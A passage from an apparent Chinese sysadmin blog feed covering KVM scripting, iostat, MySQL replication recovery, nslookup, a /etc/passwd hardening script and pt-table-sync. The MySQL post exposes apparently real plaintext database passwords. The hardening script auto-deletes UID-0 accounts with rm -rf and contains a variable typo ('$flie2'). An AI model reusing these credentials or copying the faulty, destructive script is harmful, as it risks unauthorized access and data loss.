"输入要设置的虚拟机" memory4</span><br><span class="line">         read -p "输入设置内存大小||可以增加||可以减小||【单位：GB】" memory5</span><br><span class="line">         memo2=`virsh list --all | grep $memory4 |awk -v akv=$memory4 '&#123;if($2==akv)print $3&#125;'`</span><br><span class="line">         setkvm3=`virsh list --all | awk '/'$memory4'/&#123;print $2&#125;'`</span><br><span class="line">         if [ $memo2 == "running" ] ; then</span><br><span class="line">            echo "请先将虚拟机关机！！！！！！！！！！！！！！！！！！！！"</span><br><span class="line">         elif [ $setkvm3 == $memory4 ] ; then</span><br><span class="line">             expr $memory5 + 0 &amp;&gt; /dev/null</span><br><span class="line">             if [ $? -eq 0 ] ; then</span><br><span class="line">                 virsh destroy $memory4</span><br><span class="line">                 memory6=`cat /etc/libvirt/qemu/$memory4.xml |awk -F"&gt;" '/memory/&#123;print $2&#125;'|awk -F"&lt;" '&#123;print $1&#125;'`</span><br><span class="line">                 memory7=`echo $(($memory5*1024*1024))`</span><br><span class="line">                 sed -i '/memory/s/'$memory6'/'$memory7'/' /etc/libvirt/qemu/$memory4.xml</span><br><span class="line">                 sed -i '/currentMemory/s/'$memory6'/'$memory7'/' /etc/libvirt/qemu/$memory4.xml</span><br><span class="line">                 virsh define /etc/libvirt/qemu/$memory4.xml</span><br><span class="line">                 virsh start $memory4</span><br><span class="line">                 echo "设置成功，已自动启动，当前内存为$memory6！！！！！！！！！！！"</span><br><span class="line">              else</span><br><span class="line">                  echo "请以【GB】为单位，输入整数"</span><br><span class="line">              fi</span><br><span class="line">         else</span><br><span class="line">                echo "虚拟机不存在！！！！！！！！！！！！！！！！！！！！"</span><br><span class="line">         fi</span><br><span class="line">    ;;</span><br><span class="line">    3)</span><br><span class="line">      echo =====</span><br><span class="line">      sleep 3</span><br><span class="line">    ;;</span><br><span class="line">    *)</span><br><span class="line">       break</span><br><span class="line">     ;;</span><br><span class="line">    esac</span><br><span class="line">done</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while true</span><br><span class="line">do </span><br><span class="line">    read -p "$kvm1" option1</span><br><span class="line">    case $option1 in</span><br><span class="line">    1)createkvm;;</span><br><span class="line">    2)startkvm;;</span><br><span class="line">    3)deletekvm;;</span><br><span class="line">    4)addsdkvm;;</span><br><span class="line">    5)addifcfig;;</span><br><span class="line">    6)ipactive;;</span><br><span class="line">    7)stopkvm;;</span><br><span class="line">    8)helpkvm;;</span><br><span class="line">    888)newkvm;;</span><br><span class="line">    21)catkvm;;</span><br><span class="line">    22)setkvm;;</span><br><span class="line">    23)memorykvm;;</span><br><span class="line">    9)quitkvm;;</span><br><span class="line">    h)helpkvm;;</span><br><span class="line">    q)quitkvm;;</span><br><span class="line">    esac</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Shell脚本</category>
      </categories>
      <tags>
        <tag>Shell脚本</tag>
        <tag>KVM</tag>
      </tags>
  </entry>
  <entry>
    <title>linux wa%过高，iostat查看io状况</title>
    <url>/2019/03/13/linux-wa%25%E8%BF%87%E9%AB%98%EF%BC%8Ciostat%E6%9F%A5%E7%9C%8Bio%E7%8A%B6%E5%86%B5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="linux-wa-过高，iostat查看io状况"><a href="#linux-wa-过高，iostat查看io状况" class="headerlink" title="linux wa%过高，iostat查看io状况"></a>linux wa%过高，iostat查看io状况</h1><p>在使用top命令的时候会看到这么一行：</p>
<p><img src= "/img/loading.gif" data-src="/2019/03/13/linux-wa%%E8%BF%87%E9%AB%98%EF%BC%8Ciostat%E6%9F%A5%E7%9C%8Bio%E7%8A%B6%E5%86%B5/image-20200911172137366.png" alt="image-20200911172137366"></p>
<p>翻译一下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">us：用户态使用的cpu时间比</span><br><span class="line"></span><br><span class="line">sy：系统态使用的cpu时间比</span><br><span class="line"></span><br><span class="line">ni：用做nice加权的进程分配的用户态cpu时间比</span><br><span class="line"></span><br><span class="line">id：空闲的cpu时间比</span><br><span class="line"></span><br><span class="line">wa：cpu等待磁盘写入完成时间</span><br><span class="line"></span><br><span class="line">hi：硬中断消耗时间</span><br><span class="line"></span><br><span class="line">si：软中断消耗时间</span><br><span class="line"></span><br><span class="line">st：虚拟机偷取时间</span><br><span class="line"></span><br><span class="line">如果一台机器看到wa特别高，那么一般说明是磁盘IO出现问题，可以使用iostat等命令继续进行详细分析。</span><br></pre></td></tr></table></figure>

<h2 id="1-安装-iostat"><a href="#1-安装-iostat" class="headerlink" title="1.安装 iostat"></a>1.安装 iostat</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y  install sysstat</span><br></pre></td></tr></table></figure>

<p>之后就可以使用 iostat 命令了，</p>
<h2 id="2-入门使用"><a href="#2-入门使用" class="headerlink" title="2.入门使用"></a>2.入门使用</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iostat -d -k 2</span><br></pre></td></tr></table></figure>

<p>参数 -d 表示，显示设备（磁盘）使用状态；-k某些使用block为单位的列强制使用Kilobytes为单位；2表示，数据显示每隔2秒刷新一次。</p>
<p><img src= "/img/loading.gif" data-src="/2019/03/13/linux-wa%%E8%BF%87%E9%AB%98%EF%BC%8Ciostat%E6%9F%A5%E7%9C%8Bio%E7%8A%B6%E5%86%B5/image-20200911172157348.png" alt="image-20200911172157348"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tps：该设备每秒的传输次数（Indicate the number of transfers per second that were issued to the device.）。&quot;一次传输&quot;意思是&quot;一次I&#x2F;O请求&quot;。多个逻辑请求可能会被合并为&quot;一次I&#x2F;O请求&quot;。&quot;一次传输&quot;请求的大小是未知的。</span><br><span class="line"></span><br><span class="line">kB_read&#x2F;s：每秒从设备（drive expressed）读取的数据量；kB_wrtn&#x2F;s：每秒向设备（drive expressed）写入的数据量；kB_read：读取的总数据量；</span><br><span class="line">kB_wrtn：写入的总数量数据量；这些单位都为Kilobytes。</span><br></pre></td></tr></table></figure>

<p>指定监控的设备名称为sda，该命令的输出结果和上面命令完全相同。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iostat -d sda 2</span><br></pre></td></tr></table></figure>

<p>默认监控所有的硬盘设备，现在指定只监控sda。 </p>
<h2 id="3-x-参数"><a href="#3-x-参数" class="headerlink" title="3. -x 参数"></a><strong>3. -x 参数</strong></h2><p>iostat还有一个比较常用的选项<strong>-x</strong>，该选项将用于显示和io相关的扩展数据。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iostat -d -x -k 1 10</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="/2019/03/13/linux-wa%%E8%BF%87%E9%AB%98%EF%BC%8Ciostat%E6%9F%A5%E7%9C%8Bio%E7%8A%B6%E5%86%B5/image-20200911172227964.png" alt="image-20200911172227964"></p>
<p>输出信息的含义</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rrqm/s：每秒这个设备相关的读取请求有多少被Merge了（当系统调用需要读取数据的时候，VFS将请求发到各个FS，如果FS发现不同的读取请求读取的是相同Block的数据，FS会将这个请求合并Merge）；wrqm/s：每秒这个设备相关的写入请求有多少被Merge了。</span><br><span class="line"></span><br><span class="line">rsec/s：每秒读取的扇区数；</span><br><span class="line">wsec/：每秒写入的扇区数。</span><br><span class="line">rKB/s：The number of read requests that were issued to the device per second；</span><br><span class="line">wKB/s：The number of write requests that were issued to the device per second；</span><br><span class="line">avgrq-sz 平均请求扇区的大小</span><br><span class="line">avgqu-sz 是平均请求队列的长度。毫无疑问，队列长度越短越好。    </span><br><span class="line">await：  每一个IO请求的处理的平均时间（单位是微秒毫秒）。这里可以理解为IO的响应时间，一般地系统IO响应时间应该低于5ms，如果大于10ms就比较大了。</span><br><span class="line">         这个时间包括了队列时间和服务时间，也就是说，一般情况下，await大于svctm，它们的差值越小，则说明队列时间越短，反之差值越大，队列时间越长，说明系统出了问题。</span><br><span class="line">svctm    表示平均每次设备I/O操作的服务时间（以毫秒为单位）。如果svctm的值与await很接近，表示几乎没有I/O等待，磁盘性能很好，如果await的值远高于svctm的值，　　　　　　则表示I/O队列等待太长，         　　　　　　系统上运行的应用程序将变慢。%util： 在统计时间内所有处理IO时间，除以总共统计时间。例如，如果统计间隔1秒，该设备有0.8秒在处理IO，　　　　而0.2秒闲置，那么该设备的%util = 0.8/1 = 80%，　　　　所以该参数暗示了设备的繁忙程度　　　　。一般地，如果该参数是100%表示设备已经接近满负荷运行了　　　　（当然如果是多磁盘，即使%util是100%，因为磁盘的并发能力，所以磁盘使用未必就到了瓶颈）。</span><br></pre></td></tr></table></figure>

<h2 id="4-常见用法"><a href="#4-常见用法" class="headerlink" title="4.常见用法"></a>4.<strong>常见用法</strong></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iostat -d -k 1 10         #查看TPS和吞吐量信息(磁盘读写速度单位为KB)</span><br><span class="line">iostat -d -m 2            #查看TPS和吞吐量信息(磁盘读写速度单位为MB)</span><br><span class="line">iostat -d -x -k 1 10      #查看设备使用率（%util）、响应时间（await） iostat -c 1 10 #查看cpu状态</span><br></pre></td></tr></table></figure>

<p><strong>5. 实例分析</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iostat -d -k 1 | grep vda</span><br><span class="line">Device:            tps    kB_read/s    kB_wrtn/s    kB_read    kB_wrtn</span><br><span class="line">sda10            60.72        18.95        71.53  395637647 1493241908</span><br><span class="line">sda10           299.02      4266.67       129.41       4352        132</span><br><span class="line">sda10           483.84      4589.90      4117.17       4544       4076</span><br><span class="line">sda10           218.00      3360.00       100.00       3360        100</span><br><span class="line">sda10           546.00      8784.00       124.00       8784        124</span><br><span class="line">sda10           827.00     13232.00       136.00      13232        136</span><br></pre></td></tr></table></figure>

<p>上面看到，磁盘每秒传输次数平均约400；每秒磁盘读取约5MB，写入约1MB。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iostat -d -x -k 1</span><br><span class="line">Device:    rrqm/s wrqm/s   r/s   w/s  rsec/s  wsec/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await  svctm  %util</span><br><span class="line">sda          1.56  28.31  7.84 31.50   43.65    3.16    21.82     1.58     1.19     0.03    0.80   2.61  10.29</span><br><span class="line">sda          1.98  24.75 419.80  6.93 13465.35  253.47  6732.67   126.73    32.15     2.00    4.70   2.00  85.25</span><br><span class="line">sda          3.06  41.84 444.90 54.08 14204.08 2048.98  7102.04  1024.49    32.57     2.10    4.21   1.85  92.24</span><br></pre></td></tr></table></figure>

<p>可以看到磁盘的平均响应时间&lt;5ms，磁盘使用率&gt;80。磁盘响应正常，但是已经很繁忙了。</p>
<p><img src= "/img/loading.gif" data-src="/2019/03/13/linux-wa%%E8%BF%87%E9%AB%98%EF%BC%8Ciostat%E6%9F%A5%E7%9C%8Bio%E7%8A%B6%E5%86%B5/image-20200911172537365.png" alt="image-20200911172537365"></p>
<p><strong>可以看到磁盘的平均响应时间&lt;5ms，磁盘使用率&gt;90。磁盘响应正常，但是已经很繁忙了。</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">await：  每一个IO请求的处理的平均时间（单位是微秒毫秒）。这里可以理解为IO的响应时间，一般地系统IO响应时间应该低于5ms，如果大于10ms就比较大了</span><br><span class="line">svctm    表示平均每次设备I&#x2F;O操作的服务时间（以毫秒为单位）。如果svctm的值与await很接近，表示几乎没有I&#x2F;O等待，磁盘性能很好，</span><br><span class="line">如果await的值远高于svctm的值，则表示I&#x2F;O队列等待太长，  系统上运行的应用程序将变慢。</span><br><span class="line">%util： 在统计时间内所有处理IO时间，除以总共统计时间</span><br><span class="line">所以该参数暗示了设备的繁忙程度</span><br><span class="line">。一般地，如果该参数是100%表示设备已经接近满负荷运行了（当然如果是多磁盘，即使%util是100%，因为磁盘的并发能力，所以磁盘使用未必就到了瓶颈）。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">也可以使用下面的命令，同时显示cpu和磁盘的使用情况</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="/2019/03/13/linux-wa%%E8%BF%87%E9%AB%98%EF%BC%8Ciostat%E6%9F%A5%E7%9C%8Bio%E7%8A%B6%E5%86%B5/image-20200911172609959.png" alt="image-20200911172609959"></p>
<p>等待时间超过5ms, 磁盘io有问题</p>
<p><img src= "/img/loading.gif" data-src="/2019/03/13/linux-wa%%E8%BF%87%E9%AB%98%EF%BC%8Ciostat%E6%9F%A5%E7%9C%8Bio%E7%8A%B6%E5%86%B5/image-20200911172624448.png" alt="image-20200911172624448"></p>
]]></content>
      <categories>
        <category>iostat</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>iostat</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql主从复制失效的恢复</title>
    <url>/2020/02/28/mysql%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%A4%B1%E6%95%88%E7%9A%84%E6%81%A2%E5%A4%8D/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="mysql主从复制失效的恢复"><a href="#mysql主从复制失效的恢复" class="headerlink" title="mysql主从复制失效的恢复"></a>mysql主从复制失效的恢复</h1><p>前言:<br>   由于修改了linux服务器的主机名,所以mysql主从复制失效了,现在需要恢复主从复制.这个有点不同于纯净的库的主从复制.<br>首先要把网站放一个维护页面.要不然用户会觉得你们网站坏掉了.</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1.Lock <span class="keyword">master</span> <span class="keyword">database</span> <span class="keyword">table</span>;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">master</span> <span class="keyword">status</span>;</span><br><span class="line"><span class="keyword">flush</span> <span class="keyword">table</span> <span class="keyword">with</span> <span class="keyword">read</span> <span class="keyword">lock</span>;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">master</span> <span class="keyword">status</span>;</span><br><span class="line"></span><br><span class="line">2.Backup <span class="keyword">master</span> <span class="keyword">database</span>;</span><br><span class="line">/usr/local/mysql/bin/mysqldump -uroot -p'a<span class="comment">#~f`Ej+:Q?TyU8s@CaE' -S /tmp/mysql.sock -A --events -B --master-data=2 &gt; /home/backup/mysql/kng.sql</span></span><br><span class="line">grep MASTER /home/<span class="keyword">backup</span>/mysql/kng.sql</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">master</span> <span class="keyword">status</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">Unlock</span> <span class="keyword">master</span> <span class="keyword">database</span>;</span><br><span class="line">mysql&gt; unlock tables;</span><br><span class="line"></span><br><span class="line">3.Transfer database to slave database;</span><br><span class="line">scp -r -P 3389 /home/<span class="keyword">backup</span>/mysql/kng.sql allen@<span class="number">192.168</span><span class="number">.3</span><span class="number">.3</span>:/tmp</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span><span class="keyword">recovery</span> <span class="keyword">slave</span> <span class="keyword">database</span>;</span><br><span class="line">mysql -uroot -p'a<span class="comment">#~f`Ej+:Q?TyU8s@CaE' -S /tmp/mysql.sock &lt; /home/backup/mysql/kng.sql</span></span><br><span class="line">mysql -uroot -p'a<span class="comment">#~f`Ej+:Q?TyU8s@CaE'</span></span><br><span class="line"><span class="keyword">change</span> <span class="keyword">master</span> <span class="keyword">to</span> master_host=<span class="string">'192.168.3.2'</span>,master_user=<span class="string">'remotesql'</span>,master_password=<span class="string">'EhAhoCoevU4MR,nTsJfEo'</span>, master_log_file=<span class="string">'mysql-bin.000183'</span>,master_log_pos=<span class="number">1058354975</span>;</span><br><span class="line"><span class="keyword">start</span> <span class="keyword">slave</span>;</span><br><span class="line"></span><br><span class="line">5.Show <span class="keyword">slave</span> <span class="keyword">status</span>;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">slave</span> <span class="keyword">status</span>\G</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>nslookup命令详解</title>
    <url>/2019/05/23/nslookup%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="nslookup命令详解"><a href="#nslookup命令详解" class="headerlink" title="nslookup命令详解"></a>nslookup命令详解</h1><h4 id="1、nslookup作用"><a href="#1、nslookup作用" class="headerlink" title="1、nslookup作用"></a>1、nslookup作用</h4><p>nslookup用于查询DNS的记录，查询域名解析是否正常，在网络故障时用来诊断网络问题</p>
<h4 id="2、查询"><a href="#2、查询" class="headerlink" title="2、查询"></a>2、查询</h4><p>a. 直接查询</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nslookup domain [dns-server]</span><br><span class="line"><span class="meta">#</span><span class="bash">如果没有指定dns服务器，就采用系统默认的dns服务器。12</span></span><br></pre></td></tr></table></figure>

<p>b. 查询其他记录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nslookup -qt = type domain [dns-server]</span><br><span class="line">type:</span><br><span class="line">    A --&gt;地址记录</span><br><span class="line">    AAAA   --&gt;地址记录</span><br><span class="line">    AFSDB Andrew    --&gt;文件系统数据库服务器记录</span><br><span class="line">    ATMA --&gt;ATM地址记录</span><br><span class="line">    CNAME   --&gt;别名记录</span><br><span class="line">    HINHO  --&gt;硬件配置记录，包括CPU、操作系统信息 </span><br><span class="line">    ISDN   --&gt;域名对应的ISDN号码</span><br><span class="line">    MB   --&gt;存放指定邮箱的服务器</span><br><span class="line">    MG    --&gt;邮件组记录</span><br><span class="line">    MINFO   --&gt;邮件组和邮箱的信息记录</span><br><span class="line">    MR   --&gt;改名的邮箱记录</span><br><span class="line">    MX   --&gt;邮件服务器记录</span><br><span class="line">    NS  --&gt; 名字服务器记录</span><br><span class="line">    PTR    -&gt;反向记录</span><br><span class="line">    RP    --&gt;负责人记录</span><br><span class="line">    RT  --&gt;路由穿透记录</span><br><span class="line">    SRV    --&gt;TCP服务器信息记录</span><br><span class="line">    TXT   --&gt;域名对应的文本信息</span><br><span class="line">    X25  --&gt;域名对应的X.25地址记录123456789101112131415161718192021</span><br></pre></td></tr></table></figure>

<p>c. 查询更具体的信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nslookup -d [其他参数] domain [dns-server]     </span><br><span class="line"><span class="meta">#</span><span class="bash">只要在查询的时候，加上-d参数，即可查询域名的缓存</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>nslookup</category>
      </categories>
      <tags>
        <tag>nslookup</tag>
      </tags>
  </entry>
  <entry>
    <title>passwd安全加固脚本分享</title>
    <url>/2019/12/05/passwd%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA%E8%84%9A%E6%9C%AC%E5%88%86%E4%BA%AB/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有的时候，使用chattr未必可以保证passwd不被篡改。下面分享的是/etc/passwd的安全加固脚本，相对的解决篡改问题。</p>
<p>使用前提：<br>要在$file1路径添加一份passwd的备份，可使passwd被改写后恢复，因此要保证passwd备份为正常的。<br>当新添加/修改服务或用户时,要先”chattr -i “，再修改；然后将修改后的/etc/passwd拷贝到file1路径下，且要在设定的sleep的时间内完成，否则用户修改不会生效。</p>
<p>此脚本建议使用后台运行:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod +x /script/check_passwd.sh</span><br><span class="line">nohup /script/check_passwd.sh  &amp;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">		    </span><br><span class="line"></span><br><span class="line">check() &#123;</span><br><span class="line">			    </span><br><span class="line">	TIME=`date +%F-%R`</span><br><span class="line">	file1=/etc/back/passwd</span><br><span class="line">	file2=/etc/passwd</span><br><span class="line">   </span><br><span class="line">   if [ -s $flie2 ];then</span><br><span class="line"></span><br><span class="line">	    lsattr $file2 | grep i &gt; /dev/null </span><br><span class="line">		if [ $? -eq 0 ];then</span><br><span class="line">			echo "$TIME passwd file rights is ok" &gt;&gt; /var/log/passwd_file.log</span><br><span class="line"></span><br><span class="line"><span class="meta">	#</span><span class="bash">当/etc/passwd中存在UID为0，且非root用户的用户，就删除改用户</span></span><br><span class="line">			awk -F ':' '($3==0)&#123;print $1&#125;' $file2 |grep -v root &gt; /var/log/userdel.log			                 </span><br><span class="line">			for duser in `cat  /var/log/userdel.log`</span><br><span class="line">			do</span><br><span class="line">				chattr -i /etc/passwd	        									                                   </span><br><span class="line">				userdel -r $duser</span><br><span class="line">				#sed -i "/$duser/d" /etc/passwd </span><br><span class="line">				#sed -i "/$duser/d" /etc/group</span><br><span class="line">				#sed -i  "/$duser/d" /etc/shadow</span><br><span class="line">				rm -rf /home/$duser</span><br><span class="line">				rm -rf /var/spool/mail/$duser</span><br><span class="line">				#userdel -r $duser</span><br><span class="line">				chattr +i /etc/passwd													   			              </span><br><span class="line">			done </span><br><span class="line">			</span><br><span class="line">		else</span><br><span class="line">	</span><br><span class="line"><span class="meta">   #</span><span class="bash">下方是判断文件内容是否一致 </span></span><br><span class="line">    </span><br><span class="line">    		diff $file1 $file2 &gt; /dev/null</span><br><span class="line"></span><br><span class="line">			if [ $? -eq 0 ]; then</span><br><span class="line">            	echo "$TIME  file are same"   &gt;&gt; /var/log/diff.log</span><br><span class="line">            else</span><br><span class="line">	        	echo "$TIME  file are different"  &gt;&gt; /var/log/diff.log</span><br><span class="line">			fi</span><br><span class="line">	</span><br><span class="line">			tail -n1  /var/log/diff.log |grep different  &gt; /dev/null</span><br><span class="line"></span><br><span class="line">			if   [ $? -eq 0 ]; then</span><br><span class="line">				chattr -i $file2</span><br><span class="line">				\cp $file1 $file2</span><br><span class="line">				chattr +i $file2</span><br><span class="line">				echo "$TIME ERROR: passwd file is update" &gt;&gt; /var/log/passwd_file.log</span><br><span class="line">    		fi	</span><br><span class="line">    	fi</span><br><span class="line">    else</span><br><span class="line">				</span><br><span class="line">				\cp $file1 $file2</span><br><span class="line">				chattr +i $file2</span><br><span class="line">				echo "$TIME ERROR: passwd file does not exist；passwd file is update" &gt;&gt; /var/log/passwd_file.log</span><br><span class="line">    fi</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line">	check</span><br><span class="line">	sleep 3600                                                     </span><br><span class="line">done</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>pt-table-check和pt-table-sync实践</title>
    <url>/2019/12/21/pt-table-check%E5%92%8Cpt-table-sync%E5%AE%9E%E8%B7%B5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="pt-table-check和pt-table-sync实践"><a href="#pt-table-check和pt-table-sync实践" class="headerlink" title="pt-table-check和pt-table-sync实践"></a>pt-table-check和pt-table-sync实践</h1><p><strong>Mysql 版本：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select version();</span><br><span class="line">+<span class="comment">------------+</span></span><br><span class="line">| version()  |</span><br><span class="line">+<span class="comment">------------+</span></span><br><span class="line">| 5.6.37-log |</span><br><span class="line">+<span class="comment">------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<p><strong>在主从库执行如下语句：</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">mysql&gt;GRANT SELECT, PROCESS, SUPER, REPLICATION SLAVE,CREATE,DELETE,INSERT,UPDATE ON *.* TO 'USER'@'MASTER_HOST' identified  by 'PASSWORD';</span><br><span class="line">注：创建用户，这些权限都是必须的，否则后续执行时会报错，当然，如果不想授予这么多权限，那就需要把权限对应的活先自己干了或者直接在命令行指定，比如如果不想设create权限的话，需要自己指定库和表</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>select</th>
<th>查看所有库的表，原理可加explain选项查看</th>
</tr>
</thead>
<tbody><tr>
<td>process</td>
<td>show processlist</td>
</tr>
<tr>
<td>super</td>
<td>set binlog_format=’statement’</td>
</tr>
<tr>
<td>replication slave</td>
<td>show slave hosts</td>
</tr>
</tbody></table>
<p><strong>首先测试不存在索引的情况：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">主库：</span><br><span class="line">mysql&gt; show master status;</span><br><span class="line">+<span class="comment">-----------------+----------+--------------+------------------+-------------------+</span></span><br><span class="line">| File            | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |</span><br><span class="line">+<span class="comment">-----------------+----------+--------------+------------------+-------------------+</span></span><br><span class="line">| mybinlog.000001 |      120 | AAA          |                  |                   |</span><br><span class="line">+<span class="comment">-----------------+----------+--------------+------------------+-------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> helloa;</span><br><span class="line">+<span class="comment">------+------+</span></span><br><span class="line">| id   | name |</span><br><span class="line">+<span class="comment">------+------+</span></span><br><span class="line">|    1 | jaja |</span><br><span class="line">|    2 | haja |</span><br><span class="line">+<span class="comment">------+------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> helloa \G;</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">       Table: helloa</span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">Table</span>: <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`helloa`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`name`</span> <span class="built_in">char</span>(<span class="number">10</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span></span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8</span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line">从库：</span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> helloa;</span><br><span class="line">+<span class="comment">------+------+</span></span><br><span class="line">| id   | name |</span><br><span class="line">+<span class="comment">------+------+</span></span><br><span class="line">|    1 | jaja |</span><br><span class="line">|    2 | haja |</span><br><span class="line">|    3 | wowo |</span><br><span class="line">+<span class="comment">------+------+</span></span><br><span class="line">3 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> helloa \G:</span><br><span class="line">*************************** <span class="number">1.</span> <span class="keyword">row</span> ***************************</span><br><span class="line">       <span class="keyword">Table</span>: helloa</span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">Table</span>: <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`helloa`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`name`</span> <span class="built_in">char</span>(<span class="number">10</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span></span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8</span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<p><strong>做主从同步：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; change master to</span><br><span class="line">    -&gt; master_host='192.168.18.50',</span><br><span class="line">    -&gt; master_user='repl',</span><br><span class="line">    -&gt; master_password='repl4slave',</span><br><span class="line">    -&gt; master_port=3307,</span><br><span class="line">    -&gt; master_log_file='mybinlog.000001',</span><br><span class="line">    -&gt; master_log_pos=120;</span><br><span class="line">Query OK, 0 rows affected, 2 warnings (0.11 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; start slave;</span><br><span class="line">Query OK, 0 rows affected, 1 warning (0.12 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; show slave status \G;</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">               Slave_IO_State: Waiting for master to send event</span><br><span class="line">                  Master_Host: 192.168.18.50</span><br><span class="line">                  Master_User: repl</span><br><span class="line">                  Master_Port: 3307</span><br><span class="line">                Connect_Retry: 